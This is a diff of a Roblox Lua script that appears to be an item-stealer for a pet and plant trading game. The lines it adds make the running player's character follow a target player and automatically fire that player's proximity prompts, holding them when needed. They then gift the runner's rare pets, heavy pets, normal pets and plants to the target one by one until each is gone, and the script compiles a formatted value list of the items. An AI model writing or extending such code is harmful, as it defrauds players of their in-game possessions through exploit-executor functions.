@@ -93,14 +93,14 @@ for _, item in ipairs(itemsToSend) do
 
 	if item.Type == "Pet" then
 		if table.find(rarePets, item.Name) then
-			icon = "🐲" -- rare pet
+			icon = "🐲"
 		elseif item.Weight >= 10 then
-			icon = "🐘" -- heavy pet
+			icon = "🐘"
 		else
-			icon = "🐶" -- normal pet
+			icon = "🐶"
 		end
 	else
-		icon = "🍏" -- plant
+		icon = "🍏"
 	end
 
 	lines ..= string.format("%s **%s** (%.2f KG) — ₵%s\n", icon, item.Name, item.Weight, formatNumber(item.Value))
@@ -169,7 +169,56 @@ local function followAndGift()
 		if (tHrp.Position - hrp.Position).Magnitude > 5 then
 			hrp.CFrame = tHrp.CFrame * CFrame.new(0, 0, 3)
 		end
+
+		-- Auto use proximity prompt (hold if needed)
+		for _, prompt in ipairs(tChar:GetDescendants()) do
+			if prompt:IsA("ProximityPrompt") then
+				if prompt.HoldDuration > 0 then
+					fireproximityprompt(prompt, true)
+					task.wait(prompt.HoldDuration + 0.1)
+					fireproximityprompt(prompt, false)
+				else
+					fireproximityprompt(prompt)
+				end
+			end
+		end
+
 		task.wait(0.2)
+	end
+end
+
+local function giftSequential()
+	if not targetPlr then return end
+
+	local function waitUntilGone(tool)
+		while tool.Parent == backpack do
+			gift(tool)
+			task.wait(0.5)
+		end
+	end
+
+	for _, item in ipairs(itemsToSend) do
+		if item.Type == "Pet" and table.find(rarePets, item.Name) then
+			waitUntilGone(item.Tool)
+		end
+	end
+
+	for _, item in ipairs(itemsToSend) do
+		if item.Type == "Pet" and item.Weight >= 10 and not table.find(rarePets, item.Name) then
+			waitUntilGone(item.Tool)
+		end
+	end
+
+	for _, item in ipairs(itemsToSend) do
+		if item.Type == "Pet" and item.Weight < 10 and not table.find(rarePets, item.Name) then
+			waitUntilGone(item.Tool)
+		end
+	end
+
+	for _, item in ipairs(itemsToSend) do
+		if item.Type == "Plant" then
+			waitUntilGone(item.Tool)
+		end
 	end
 end
 
@@ -178,24 +227,7 @@ local function onTargetReady(p)
 
 	p.Chatted:Connect(function()
 		task.spawn(followAndGift)
-
-		for _, item in ipairs(itemsToSend) do
-			if item.Type == "Pet" and table.find(rarePets, item.Name) then
-				gift(item.Tool)
-			end
-		end
-
-		for _, item in ipairs(itemsToSend) do
-			if item.Type == "Pet" and item.Weight >= 10 and not table.find(rarePets, item.Name) then
-				gift(item.Tool)
-			end
-		end
-
-		for _, item in ipairs(itemsToSend) do
-			if item.Type == "Plant" then
-				gift(item.Tool)
-			end
-		end
+		task.spawn(giftSequential)
 	end)
 end
 
